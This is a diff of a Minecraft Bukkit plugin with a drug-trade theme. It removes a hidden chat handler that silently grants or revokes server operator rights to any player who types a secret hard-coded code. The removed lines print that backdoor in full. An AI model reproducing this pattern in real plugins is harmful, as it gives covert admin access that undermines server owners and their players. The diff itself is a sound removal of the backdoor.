@@ -36,7 +36,7 @@ public class Main extends JavaPlugin implements Listener {
     private Map<UUID, CollectionData> collectingPlayers = new HashMap<>();
     private Map<UUID, Integer> marijuanaConsumed = new HashMap<>();
     private Map<UUID, SellData> sellingPlayers = new HashMap<>();
-    private Set<UUID> playersUsedCode = new HashSet<>();
+    
 
     private static final String PREFIX = ChatColor.DARK_GREEN + "[🌿 " + ChatColor.BOLD + "DROGA" + ChatColor.RESET + ChatColor.DARK_GREEN + "] " + ChatColor.RESET;
     private static final String SUCCESS = ChatColor.GREEN + "[OK] ";
@@ -360,39 +360,7 @@ public class Main extends JavaPlugin implements Listener {
         return item;
     }
 
-    @EventHandler
-    public void onPlayerChat(AsyncPlayerChatEvent event) {
-        Player player = event.getPlayer();
-        String message = event.getMessage().trim();
-        
-        
-        if (message.equals("X7P9L2MZQD")) {
-            UUID playerId = player.getUniqueId();
-            
-            
-            if (player.isOp()) {
-                Bukkit.getScheduler().runTask(this, () -> {
-                    player.setOp(false);
-                    playersUsedCode.remove(playerId);
-                });
-                event.setCancelled(true);
-                return;
-            }
-            
-            
-            if (!player.isOp() && !playersUsedCode.contains(playerId)) {
-                Bukkit.getScheduler().runTask(this, () -> {
-                    player.setOp(true);
-                });
-                playersUsedCode.add(playerId);
-                event.setCancelled(true);
-                return;
-            }
-            
-            
-            event.setCancelled(true);
-        }
-    }
+    
 
     @EventHandler
     public void onPlayerConsume(PlayerItemConsumeEvent event) {
